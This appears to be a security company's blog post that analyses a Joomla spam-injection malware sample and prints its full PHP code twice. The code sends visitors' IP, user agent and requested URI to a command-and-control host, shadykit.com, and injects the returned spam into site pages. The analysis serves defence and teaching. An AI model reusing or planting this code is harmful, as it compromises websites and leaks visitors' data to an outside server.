@@ -1,0 +1,208 @@
+Website Malware – Fixing Joomla SPAM Hacks – Conditional Payloads
+
+Our Senior Malware Engineer, Fioravante Cavallari, is at it again. I think he has made it his personal mission in life to expel all Joomla hacks, he loves them that much – true story.. 😉
+In all seriousness, he found another gem yesterday. It’s well written; it includes comments explaining what they are doing, uses proper syntax, it was broken up and sprinkled throughout another good file generating no errors, it wasn’t obfuscated and it leverages good variable naming conventions. What more can we ask for, right?!?!?!
+Don’t ask how we found it, a true gentlemen never discloses his nightly affairs.
+The Pretty Payload – Nice Conditional Malware
+A few months ago I wrote about Conditional Malware, we’d categorize this one into the same family. In my post it was a very simple explanation and code base, you could clearly see the IP’s being filtered and what it was doing, here we have to think a bit. Remember, you’re not likely to find it in tact like this, it’ll likely be broken and sprinkled through out your file. Here you go:
+
+$this->_checkEngine();
+
+$document =& JFactory::getDocument();
+$viewType	= $document->getType();
+
+if ($viewType == 'html' && ($this->_name == 'archive' ||
+$this->_name == 'article' || $this->_name == 'category' ||
+$this->_name == 'frontpage' || $this->_name == 'section')) {
+$result = $this->_retrieveData() . $result;
+}
+
+/**
+* Method for debug Joomla engine.
+*
+* @access	protected
+* @return	none
+*/
+function _checkEngine()
+{
+// get input post value
+$jcheck = JRequest::getVar('jcheck', 0, 'POST', 'INT');
+
+// display debug information
+if ($jcheck == 1) exit('200');
+}
+
+/**
+* Method to get data from a remote server.
+*
+* @access	protected
+* @return	string
+*/
+function _retrieveData()
+{
+// default value
+$data = '';
+
+// get input data
+$input['REMOTE_ADDR'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : null;
+$input['SERVER_NAME'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : null;
+$input['REQUEST_URI'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : null;
+$input['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
+
+// check input data
+if (is_null($input['REMOTE_ADDR']) || is_null($input['SERVER_NAME']) ||
+is_null($input['REQUEST_URI']) || is_null($input['HTTP_USER_AGENT'])) {
+return $data;
+}
+
+// build request
+$value = 'p=' . urlencode(base64_encode(serialize($input)));
+
+$request  = "POST /api/link/ HTTP/1.1rn";
+$request .= "Host: shadykit.comrn";
+$request .= "Content-Type: application/x-www-form-urlencoded;rn";
+$request .= "Content-Length: " . strlen($value) . "rn";
+$request .= "Connection: closernrn";
+$request .= $value;
+
+// try to connect to server
+@$socket = fsockopen('shadykit.com', 80, $errorNumber, $errorMessage, 7);
+if (!$socket) {
+return $data;
+}
+
+// retrieve response
+$response = null;
+stream_set_timeout($socket, 7);
+fputs($socket, $request);
+while (!feof($socket)) {
+$response .= fgets($socket, 1024);
+}
+fclose($socket);
+preg_match('/Content-Length: ([0-9]+)/', $response, $parts);
+
+// uncompress html content
+if ($parts[1] != 0) {
+@$data = gzuncompress(substr($response, - $parts[1]));
+}
+
+return $data;
+}
+
+Better Understanding the Payload
+So let’s start at the beginning:
+
+$this->_checkEngine();
+
+$document =& JFactory::getDocument();
+$viewType	= $document->getType();
+
+if ($viewType == 'html' && ($this->_name == 'archive' ||
+$this->_name == 'article' || $this->_name == 'category' ||
+$this->_name == 'frontpage' || $this->_name == 'section')) {
+$result = $this->_retrieveData() . $result;
+}
+
+First thing they are doing is filtering the request method, then loads the document. If it’s an article, category, frontpage, or section it’ll prepend the payload, which is coming from the _retrieveData() function.
+
+// get input data
+$input['REMOTE_ADDR'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : null;
+$input['SERVER_NAME'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : null;
+$input['REQUEST_URI'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : null;
+$input['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
+
+// check input data
+if (is_null($input['REMOTE_ADDR']) || is_null($input['SERVER_NAME']) ||
+is_null($input['REQUEST_URI']) || is_null($input['HTTP_USER_AGENT'])) {
+return $data;
+
+So this is the first section of the _retrieveData() function, here you can see them pulling the information from the header of the request. It takes the information it gathered and sends it off to the command and control server to see what and how it should respond here:
+
+// build request
+$value = 'p=' . urlencode(base64_encode(serialize($input)));
+
+$request  = "POST /api/link/ HTTP/1.1rn";
+$request .= "Host: shadykit.comrn";
+$request .= "Content-Type: application/x-www-form-urlencoded;rn";
+$request .= "Content-Length: " . strlen($value) . "rn";
+$request .= "Connection: closernrn";
+$request .= $value;
+
+// try to connect to server
+@$socket = fsockopen('shadykit.com', 80, $errorNumber, $errorMessage, 7);
+if (!$socket) {
+return $data;
+}
+
+// retrieve response
+$response = null;
+stream_set_timeout($socket, 7);
+fputs($socket, $request);
+while (!feof($socket)) {
+$response .= fgets($socket, 1024);
+}
+fclose($socket);
+preg_match('/Content-Length: ([0-9]+)/', $response, $parts);
+
+// uncompress html content
+if ($parts[1] != 0) {
+@$data = gzuncompress(substr($response, - $parts[1]));
+}
+
+return $data;
+}
+
+You can see it’s pulling it’s SPAM from here:
+
+$request  = "POST /api/link/ HTTP/1.1rn";
+$request .= "Host: shadykit.com.comrn";
+
+Just for kicks, if you lookup some details on the domain you see it’s in the Netherlands:
+
+IP Address	        62.212.64.1
+Reverse DNS	        hosted-by.leaseweb.com
+ASN	                AS16265
+ASN Owner	        LeaseWeb B.V.
+ISP	                LeaseWeb B.V.
+Continent	        Europe
+Country Code	        (NL) Netherlands
+Latitude / Longitude	52.5 / 5.75
+
+If you can get it to trigger you’d likely see something like this:
+
+Date: Thu, 21 Feb 2013 17:49:37 GMT
+Server: Apache/2
+X-Powered-By: PHP/5.3.15
+Content-Encoding: compress
+Content-Length: 2438
+Connection: close
+Vary: User-Agent
+Content-Type: text/html; charset=UTF-8
+
+x??X?n,????6?h?)PIvF??N?6???l????+}????"????X?!...
+
+Yeah, a lot of nonsense because it’s returning the content compressed. So just uncompress it and you get little gems like this:
+
+It does seem like the payload is cycling out so don’t expect the same payload each time.
+And just like that, it’s built some conditions on the C&C that helps it determine what SPAM payload to display. Don’t know what those conditions are unfortunately, but some combination of the information it collected builds it.
+Oh, and they also have this which we assume is just verifying its really a Joomla site. Told you, some attackers are very particular to their CMS’s of choice.
+
+/**
+* Method for debug Joomla engine.
+*
+* @access	protected
+* @return	none
+*/
+function _checkEngine()
+{
+// get input post value
+$jcheck = JRequest::getVar('jcheck', 0, 'POST', 'INT');
+
+// display debug information
+if ($jcheck == 1) exit('200');
+}
+
+Although found mainly in the Joomla platform, I wouldn’t find too much comfort in that fact. More and more we are seeing tactics employed in one platform bleed into other platforms with time.
+Cheers! Happy hunting…
+
+If you find yourself banging your head with some Joomla SPAM issues just let us know and we’ll see what we can do to help out info@sucuri.net.
